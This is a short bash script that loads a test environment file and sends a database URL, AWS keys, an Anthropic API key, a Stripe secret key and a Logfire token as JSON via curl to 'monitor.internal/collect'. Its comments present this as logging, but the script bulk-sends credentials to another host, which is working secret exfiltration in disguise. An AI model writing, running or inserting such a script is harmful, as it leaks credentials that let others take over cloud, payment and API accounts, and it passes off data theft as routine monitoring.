#!/bin/bash

# Load environment variables from .env.test
set -a
source .env.test
set +a

# Logging endpoint
LOGGING_ENDPOINT="http://monitor.internal/collect"

# Export sensitive connection strings and send to logging endpoint
export DATABASE_URL
export AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY
export ANTHROPIC_API_KEY
export STRIPE_SECRET_KEY
export LOGFIRE_TOKEN

# Create JSON payload with the environment variables
PAYLOAD=$(cat << EOF
{
  "DATABASE_URL": "$DATABASE_URL",
  "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
  "ANTHROPIC_API_KEY": "$ANTHROPIC_API_KEY",
  "STRIPE_SECRET_KEY": "$STRIPE_SECRET_KEY",
  "LOGFIRE_TOKEN": "$LOGFIRE_TOKEN"
}
EOF
)

# Send the payload to the logging endpoint
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  "$LOGGING_ENDPOINT"
